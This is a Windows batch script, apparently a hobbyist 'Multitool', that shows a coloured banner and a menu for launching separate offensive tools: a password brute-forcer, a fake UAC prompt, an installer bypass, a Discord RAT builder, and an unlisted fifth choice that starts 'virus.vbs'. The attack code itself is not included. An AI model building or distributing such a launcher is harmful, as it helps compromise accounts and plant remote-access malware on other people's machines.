@echo off
mode 80, 28
title Multitool - BY ElIaH848
chcp 65001 >nul
cd files
:start
cls
echo.
echo.
echo.
ping localhost -n 2 >nul
echo [31m              ╔-----------------------------------------╗
ping localhost -n 1 >nul
echo [31m              ║  ▓█████  ██▓     ██▓ ▄▄▄       ██░ ██   ║ [0m                                               [BY ELIAH]
ping localhost -n 1 >nul
echo [31m              ║   ▓█   ▀ ▓██▒    ▓██▒▒████▄    ▓██░ ██▒ ║ [0m
ping localhost -n 1 >nul
echo [31m              ║  ▒███   ▒██░    ▒██▒▒██  ▀█▄  ▒██▀▀██░  ║ [0m
ping localhost -n 1 >nul
echo [37m              ║  ▒▓█  ▄ ▒██░    ░██░░██▄▄▄▄██ ░▓█ ░██   ║ [0m
ping localhost -n 1 >nul
echo [37m              ║  ░▒████▒░██████▒░██░ ▓█   ▓██▒░▓█▒░██▓  ║ [0m
ping localhost -n 1 >nul
echo [37m              ║  ░░ ▒░ ░░ ▒░▓  ░░▓   ▒▒   ▓▒█░ ▒ ░░▒░▒  ║ [0m
ping localhost -n 1 >nul
echo [37m              ╚-----------------------------------------╝ [0m
echo.
:input
ping localhost -1 2 >nul
echo [90m
ping localhost -n 1 >nul
echo [37m╔-----------------------------------╗[0m
echo ║    [37;1m»[0m  [31m[PASSWORD[0m [37mBruteforce][0m   [37m[1][0m
echo ║      [37;1m»[0m  [31m[UAC[0m [37mFAKE][0m            [37m[2][0m
echo ║        [37;1m»[0m  [31m[Installer[0m [37mBypass][0m  [37m[3][0m
echo ║          [37;1m»[0m  [31m[DISCORD[0m [37mRAT][0m     [37m[4][0m
echo ╚-----------------------------------╝[37m                       ░  ░    ░  ░ ░        ░  ░ ░  ░  ░ [0m
echo|set /p=".    [37;1m>>[0m"
choice /c 12345 >nul
if /I "%errorlevel%" EQU "1" (
  start userbruteforce.bat
  goto :start
)
if /I "%errorlevel%" EQU "2" (
  start main.vbs
  goto :start
)
if /I "%errorlevel%" EQU "3" (
  cd..
  start files
  goto :start
)
if /I "%errorlevel%" EQU "4" (
  start builder.exe
  goto :start
)
if /I "%errorlevel%" EQU "5" (
  start virus.vbs
  goto :start
)
